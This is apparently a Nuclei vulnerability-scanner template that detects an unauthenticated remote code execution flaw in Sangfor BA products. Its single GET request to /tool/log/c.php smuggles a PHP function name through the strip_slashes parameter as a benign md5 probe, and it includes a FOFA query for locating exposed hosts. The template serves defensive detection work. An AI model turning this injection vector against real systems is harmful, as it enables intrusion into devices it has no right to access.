id: sangfor-ba-rce
info:
  name: Sangfor BA - Remote Code Execution
  author: ritikchaddha
  severity: critical
  description: Sangfor BA products have a critical vulnerability which can be exploited
    by remote unauthenticated users to execute arbitrary commands.
  reference:
  - https://mobile.twitter.com/sec715/status/1406886851072253953
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  metadata:
    verified: true
    fofa-query: app="sangfor"
    impact: The impact of Sangfor BA's remote code execution vulnerability is that
      it enables unauthorized individuals to run malicious commands on affected products.
    recommendation: I highly recommend updating all Sangfor BA products to prevent
      remote unauthenticated users from executing arbitrary commands through Remote
      Code Execution.
  tags: rce,sangfor
requests:
- method: GET
  path:
  - '{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '{{md5("{{randstr}}")}}'
  - type: status
    status:
    - 200
